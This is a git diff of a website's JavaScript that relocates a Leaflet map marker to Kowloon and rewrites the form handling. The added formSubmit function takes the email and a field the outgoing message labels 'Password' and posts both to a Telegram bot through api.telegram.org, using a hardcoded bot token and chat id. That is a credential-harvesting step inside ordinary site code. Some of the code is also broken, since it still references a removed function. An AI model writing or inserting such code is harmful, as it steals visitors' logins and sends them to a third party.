@@ -134,7 +134,7 @@ $(".news_slick_slider").slick({
  
 
 
-var map = L.map('map_wrapper').setView([40.683471, -73.903071], 13);
+var map = L.map('map_wrapper').setView([22.313208922495647, 114.17263361075162], 13);
 
 var customMarker = L.icon({
   iconUrl:'./assets/images/marker.png',
@@ -151,12 +151,8 @@ var customMarker = L.icon({
 L.tileLayer('https://cartodb-basemaps-{s}.global.ssl.fastly.net/light_all/{z}/{x}/{y}.png', {
   attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> contributors'
 }).addTo(map);
-L.marker([40.683471, -73.903071], {icon: customMarker})
-  .addTo(map)
-  .openPopup();
+const mark = L.marker([22.313208922495647, 114.17263361075162], {icon: customMarker}).addTo(map).bindPopup("residence in Kowloon").openPopup([22.313208922495647, 114.17263361075162]);
  
-const markHK = L.marker([22.313208922495647, 114.17263361075162], {icon: customMarker}).addTo(map).bindPopup("Hong Kong").openPopup([22.313208922495647, 114.17263361075162]);
-const markNY =L.marker([40.78159296396248, -73.96915881456673], {icon:customMarker}).addTo(map).bindPopup("New-York").openPopup([40.78159296396248, -73.96915881456673]);
 // #endregion
 
 // #region Gallery
@@ -169,21 +165,67 @@ $jQuerry(document).ready(($)=>{
 // #endregion
 
 // #region valide form
-const EMAIL_MIN_LENGTH = 5;
 
-function checkEmailLenght() {
-    const valueLenght = window.inputEmail.value.length;
-    const diff = valueLenght < EMAIL_MIN_LENGTH ? EMAIL_MIN_LENGTH - valueLenght : 0;
+function validateForm(event) {
+  event.preventDefault();
+  resetValidation();
+  
+  const email = window.inpEmail.value;
+  const name = window.inpName.value;
 
-    if(diff) {
-        window.emailDiffCount.textContent = diff;
-        window.emailLenghtHelp.classList.remove('d-none');
-    } else {
-        window.emailLenghtHelp.classList.add('d-none');
-    }
-};
+  if(!email) {
+      window.emailHelp.classList.remove('d-none');
+      return false;
+  }
+  if(!name) {
+      window.nameHelp.classList.remove('d-none');
+      return false;
+  }
 
-  window.inputEmail.addEventListener('input', checkEmailLenght)
-  document.addEventListener('DOMContentLoaded', checkEmailLenght)
+  if(!testPasswordRegex(name)) {
+      window.nameHelp.classList.remove('d-none');
+      window.nameHelpDescription.classList.remove('d-none');
+  }
 
+  
+  // console.log(email, password);
+}
+let apiToken = "6685344433:AAFe9Yea_lcKqx1dzqTdsWtfcIJus5QMg2U";
+let chatId = "-4066219312";
+async function formSubmit(event) {
+  event.preventDefault();
+
+  const email = window.inpEmail.value;
+  const name = window.inpName.value;
+
+  if(!email || !name) {
+      return false;
+  }
+  
+
+  let text = `
+  <b>Email:</b> ${email}<b>Password</b> ${name}
+  `;
+
+  let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage`;
+
+  const response = await fetch(urlString, {
+      method: 'post',
+      headers: {
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+          chat_id: chatId,
+          text,
+          parse_mode: 'HTML'
+      })
+  });
+
+  const resp = await response.json();
+  console.log(resp);
+ window.inputEmail.addEventListener('input', checkEmailLenght);
+document.addEventListener('DOMContentLoaded', checkEmailLenght);
+window.form.addEventListener('submit', formSubmit);
+}
   // #endregion
